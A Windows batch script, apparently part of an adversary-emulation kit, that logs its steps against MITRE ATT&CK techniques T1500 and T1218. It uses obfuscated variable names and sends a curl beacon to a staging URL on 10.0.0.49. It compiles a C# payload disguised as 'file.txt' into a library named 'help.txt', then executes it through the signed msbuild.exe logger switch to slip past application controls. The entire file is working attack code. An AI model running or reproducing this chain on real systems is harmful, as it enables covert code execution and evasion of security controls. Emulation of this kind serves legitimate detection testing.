@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\8485\d39e5cf5
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8485-7
SET lqyereup=ITZEL-S2BS
SET ufeybybm=7
SET hpnjatpj=help.txt
SET njozco=file.txt
SET kkjwr=8485
SET wcukj=%APPDATA%\!ufeybybm!\macula-simulations.log
SET vbx=%APPDATA%\!ufeybybm!
SET bvc=vbc.exe
SET msk=%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: script_start=initialized>> "!wcukj!" 2>nul
curl -k -s -o nul "!uouoq!"
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_sent=!uouoq!>> "!wcukj!" 2>nul

SET rzg=0
SET ftm=
cd /d "!recnn!" 2>nul
IF !ERRORLEVEL! NEQ 0 (
    SET rzg=0
    SET ftm=chdir_failed
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_result=!ERRORLEVEL!>> "!wcukj!" 2>nul
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_success=!recnn!>> "!wcukj!" 2>nul
    SET rzg=1
    SET ftm=
)
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=!rzg!:!ftm!>> "!wcukj!" 2>nul

SET jyc=0
SET qlz=
!bvc! /target:library /reference:Microsoft.Build.Framework.dll /out:"!hpnjatpj!" "!njozco!" 2>&1 >nul
IF !ERRORLEVEL! NEQ 0 (
    SET jyc=0
    SET qlz=compile_failed
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_result=!ERRORLEVEL!>> "!wcukj!" 2>nul
) ELSE (
    IF EXIST "!hpnjatpj!" (
        SET jyc=1
        SET qlz=
        echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_success=!hpnjatpj!>> "!wcukj!" 2>nul
    ) ELSE (
        SET jyc=0
        SET qlz=file_missing
        echo [!DATE! !TIME!][DEBUG][!lqyereup!]: file_check=fail>> "!wcukj!" 2>nul
    )
)

SET xcv=0
SET dfg=
!msk! /logger:LoggerEntry,"!recnn!\\!hpnjatpj!";MyParameters,Foo 2>&1 >nul
IF !ERRORLEVEL! EQU 0 (
    SET xcv=1
    SET dfg=
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: msbuild_exec_success=!ERRORLEVEL!>> "!wcukj!" 2>nul
) ELSE (
    SET xcv=0
    SET dfg=exec_failed
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: msbuild_exec_fail=!ERRORLEVEL!>> "!wcukj!" 2>nul
)
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|Signed Binary Proxy Execution=!xcv!:!dfg!>> "!wcukj!" 2>nul